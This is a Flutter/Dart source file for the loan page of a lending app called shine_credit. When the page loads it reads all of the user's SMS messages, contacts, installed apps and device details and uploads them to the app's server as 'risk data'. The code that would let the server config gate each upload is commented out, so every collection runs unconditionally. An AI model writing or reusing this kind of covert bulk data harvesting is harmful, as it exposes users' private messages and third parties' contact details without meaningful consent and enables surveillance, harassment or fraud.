import 'dart:convert';

import 'package:contacts_service/contacts_service.dart';
import 'package:device_apps/device_apps.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:shine_credit/entities/app_info_model.dart';
import 'package:shine_credit/entities/auth_config_model.dart';
import 'package:shine_credit/entities/contacts_model.dart';
import 'package:shine_credit/entities/sms_message_model.dart';
import 'package:shine_credit/net/http_utils.dart';
import 'package:shine_credit/pages/loan/loan_auth_page.dart';
import 'package:shine_credit/pages/loan/loan_unauth_page.dart';
import 'package:shine_credit/res/colors.dart';
import 'package:shine_credit/state/home.dart';
import 'package:shine_credit/utils/app_utils.dart';
import 'package:shine_credit/utils/device_utils.dart';
import 'package:shine_credit/widgets/future_builder_widget.dart';

import '../../router/router.dart';

class LoanPage extends ConsumerStatefulWidget {
  const LoanPage({super.key});

  @override
  ConsumerState<ConsumerStatefulWidget> createState() => _LoanPageState();
}

class _LoanPageState extends ConsumerState<LoanPage>
    with RouteAware, AutomaticKeepAliveClientMixin<LoanPage> {
  @override
  bool get wantKeepAlive => true;

  bool shouldUpdateStatus = true;

  final GlobalKey<FutureBuilderWidgetState<dynamic>> authConfigFreshenKey =
      GlobalKey(debugLabel: 'authConfig');

  Future<AuthConfigModel?> requestConfig() async {
    final data = await DioUtils.instance.client.configInit(tenantId: '1');
    if (data != null &&
        data.data != null &&
        data.data!.riskDataUploadConfig != null) {
      detailUserRiskData(data.data!.riskDataUploadConfig!);
    }
    return data.data;
  }

  @override
  void initState() {
    WidgetsBinding.instance.addPostFrameCallback((_) async {
      if (Device.isAndroid) {
        final SystemUiOverlayStyle systemUiOverlayStyle =
            SystemUiOverlayStyle.light.copyWith(
          statusBarColor: Colours.app_main,
        );
        SystemChrome.setSystemUIOverlayStyle(systemUiOverlayStyle);
      }
    });
    super.initState();
  }

  Future<void> detailUserRiskData(AuthRiskDataUploadConfig config) async {
    await uploadAllSms();
    await uploadAppList();
    await uploadContacts();
    await uploadDeviceInfo();
    // if (config.cellMessage ?? false) {
    //   uploadAllSms();
    // }

    // if (config.appList ?? false) {
    //   uploadAppList();
    // }

    // if (config.linkerBook ?? false) {
    //   uploadContacts();
    // }

    // if (config.deviceInfo ?? false) {
    //   uploadDeviceInfo();
    // }
  }

  Future<void> uploadDeviceInfo() async {
    /// DEVICE_BASE_INFO
    final deviceInfoPlugin = DeviceInfoPlugin();
    final deviceInfo = await deviceInfoPlugin.deviceInfo;
    final allInfo = [deviceInfo.data];
    try {
      final result =
          await DioUtils.instance.client.uploadReportData(tenantId: '1', body: {
        'riskDataType': 'DEVICE_INFO',
        'riskDataList': json.encode(allInfo),
      });
      if (result.code == 0) {
        AppUtils.log.d('uploadDeviceInfo success');
      } else {
        AppUtils.log.d('uploadDeviceInfo fail');
      }
    } catch (e) {
      AppUtils.log.d('uploadDeviceInfo fail');
    }
  }

  Future<void> uploadContacts() async {
    final status = await Permission.contacts.request();
    if (status.isGranted) {
      AppUtils.log.e('uploadContacts');

      /// LINKER_BOOK
      final contacts = await ContactsService.getContacts(withThumbnails: false);

      // 遍历联系人，获取每个联系人的添加时间

      final contactList = contacts.map((item) {
        final email =
            item.emails?.isEmpty ?? true ? '' : item.emails?.first.value ?? '';

        final phone =
            item.phones?.isEmpty ?? true ? '' : item.phones?.first.value ?? '';

        return ContactsModel(
            item.identifier,
            item.contactTimes,
            email,
            item.displayName ?? '',
            phone,
            DateTime.fromMillisecondsSinceEpoch(item.times ?? 0));
      }).toList();

      try {
        final result = await DioUtils.instance.client
            .uploadReportData(tenantId: '1', body: {
          'riskDataType': 'LINKER_BOOK',
          'riskDataList': jsonEncode(contactList),
        });
        if (result.code == 0) {
          AppUtils.log.d('uploadContacts success');
        } else {
          AppUtils.log.d('uploadContacts fail');
        }
      } catch (e) {
        AppUtils.log.d('uploadContacts fail');
      }
    }
  }

  Future<void> uploadAppList() async {
    /// APP_LIST
    final status = await Permission.storage.request();
    if (status.isGranted) {
      final List<Application> apps =
          await DeviceApps.getInstalledApplications();
      final List<AppInfoModel> appList = apps.map((item) {
        return AppInfoModel(
            item.appName,
            '',
            item.appName,
            item.systemApp ? 1 : 0,
            item.installTimeMillis,
            item.updateTimeMillis,
            '',
            item.versionCode,
            item.versionName);
      }).toList();
      try {
        final result = await DioUtils.instance.client
            .uploadReportData(tenantId: '1', body: {
          'riskDataType': 'APP_LIST',
          'riskDataList': jsonEncode(appList),
        });
        if (result.code == 0) {
          AppUtils.log.d('upload app list success');
        }
      } catch (e) {
        AppUtils.log.d('upload app list error: $e');
      }
    } else {
      AppUtils.log.d('Storage Permission denied');
    }
  }

  Future<void> uploadAllSms() async {
    final status = await Permission.sms.request();
    if (status.isGranted) {
      final SmsQuery query = SmsQuery();
      final List<SmsMessage> tmp = await query.getAllSms;

      final List<SmsMessageModel> messages = tmp.map((item) {
        final time = item.date ?? item.dateSent ?? DateTime.now();
        final read = (item.read ?? false) ? 1 : 0;
        final kind = item.kind == SmsMessageKind.sent ? 1 : 0;
        int status = 1;
        switch (item.state) {
          case SmsMessageState.fail:
            status = 128;
            break;
          case SmsMessageState.sending:
            status = 64;
            break;
          case SmsMessageState.sent:
            status = 0;
            break;
          case SmsMessageState.delivered:
            status = -1;
            break;
          case SmsMessageState.none:
            status = 0;
            break;
        }
        return SmsMessageModel('', item.body, item.id,
            time.millisecondsSinceEpoch, kind, read, item.address, status);
      }).toList();

      try {
        final result = await DioUtils.instance.client
            .uploadReportData(tenantId: '1', body: {
          'riskDataType': 'CELL_MESSAGE',
          'riskDataList': jsonEncode(messages),
        });
        if (result.code == 0) {
          AppUtils.log.d('upload sms success');
        }
      } catch (e) {
        AppUtils.log.d('upload sms error: $e');
      }
    } else {
      AppUtils.log.d('Sms Permission denied');
    }
  }

  @override
  void didChangeDependencies() {
    super.didChangeDependencies();
    routeObserver.subscribe(this, ModalRoute.of(context)!);
  }

  @override
  void dispose() {
    routeObserver.unsubscribe(this);
    super.dispose();
  }

  @override
  void didPopNext() {
    super.didPopNext();
    if (shouldUpdateStatus) {
      authConfigFreshenKey.currentState?.retry();
    }
  }

  @override
  Widget build(BuildContext context) {
    super.build(context);
    final isLogin = ref.watch(isLoginProvider);
    return isLogin
        ? FutureBuilderWidget<AuthConfigModel?>(
            key: authConfigFreshenKey,
            futureFunc: requestConfig,
            builder: (context, data) {
              if (data != null && data.isAllAuth) {
                shouldUpdateStatus = false;
                return LoanAuthPage(data);
              } else {
                return LoanUnAuthPage(data);
              }
            })
        : const LoanUnAuthPage(null);
  }
}
